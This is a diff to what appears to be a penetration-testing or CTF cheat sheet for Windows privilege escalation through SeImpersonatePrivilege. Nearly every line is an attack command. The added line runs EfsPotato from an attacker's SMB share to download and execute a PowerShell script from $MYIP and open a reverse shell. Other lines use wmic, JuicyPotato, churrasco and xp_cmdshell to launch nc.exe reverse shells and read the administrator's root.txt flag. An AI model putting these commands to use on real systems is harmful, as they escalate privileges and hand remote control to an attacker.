@@ -1506,10 +1506,10 @@ $a.GetExportedTypes() | ForEach-Object { $_.FullName }
 [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils].GetMethods() | ft Name, IsStatic, ReturnType
 
 +---------- SeImpersonatePrivilege ----------+
+forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd /c \\$MYIP\$\EfsPotato.exe """powershell -c IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/resh.ps1');resh -Reverse $MYIP -Port 5566"""
 wmic process call create "\\$MYIP\$\EfsPotato.exe \"\\$MYIP\$\nc.exe $MYIP 5566 -e cmd\""
 wmic process call create "\\$MYIP\$\jp32.exe -l 1337 -p \"cmd.exe\" -a \"/c \\$MYIP\$\nc.exe $MYIP 5566 -e cmd\"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
 wmic process call create "\\$MYIP\$\churrasco.exe -d \"\\$MYIP\$\nc.exe -e cmd.exe $MYIP 5566\""
-forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd /c \\$MYIP\$\EfsPotato.exe \"\\$MYIP\$\nc.exe $MYIP 5566 -e cmd\""
 xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c C:\programdata\nc.exe $MYIP 5566 -e cmd"
 xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c type C:\Users\Administrator\Desktop\root.txt"
 
